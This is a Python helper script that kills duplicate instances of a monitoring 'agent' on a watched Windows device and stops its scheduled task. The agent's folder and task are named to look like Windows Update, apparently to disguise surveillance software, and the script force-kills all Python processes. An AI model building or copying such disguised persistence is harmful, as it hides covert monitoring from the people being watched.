"""
Kill duplicate agent processes
Run this on the monitored device to clean up multiple instances
"""
import subprocess
import os
import time

def main():
    print("=" * 50)
    print("  Killing duplicate agent processes")
    print("=" * 50)
    print()
    
    # Kill all pythonw processes (background Python)
    print("Killing pythonw.exe processes...")
    subprocess.run(['taskkill', '/f', '/im', 'pythonw.exe'], capture_output=True)
    
    # Kill python processes that might be running the agent
    print("Killing python.exe processes running agent...")
    
    try:
        import psutil
        killed = 0
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline') or []
                cmdline_str = ' '.join(cmdline).lower()
                
                # Kill any process running our agent
                if any(x in cmdline_str for x in ['src.main', 'monitor_service', 'windowsupdate']):
                    print(f"  Killing PID {proc.info['pid']}: {cmdline_str[:80]}...")
                    proc.kill()
                    killed += 1
            except:
                pass
        
        print(f"  Killed {killed} processes")
    except ImportError:
        print("  psutil not available, using taskkill...")
        subprocess.run(['taskkill', '/f', '/im', 'python.exe'], capture_output=True)
    
    # Also stop the scheduled task temporarily
    print("\nStopping scheduled task...")
    subprocess.run(['schtasks', '/end', '/tn', 'WindowsUpdateService'], capture_output=True)
    
    print()
    print("=" * 50)
    print("  Done! All agent processes killed.")
    print("=" * 50)
    print()
    print("Now you can:")
    print("1. Start a single agent manually:")
    print("   cd %LOCALAPPDATA%\\WindowsUpdate\\agent")
    print("   python -m src.main --server http://<DASHBOARD_IP>:5000")
    print()
    print("Or wait for the scheduled task to restart it (single instance).")
    print()
    input("Press Enter to exit...")


if __name__ == '__main__':
    main()
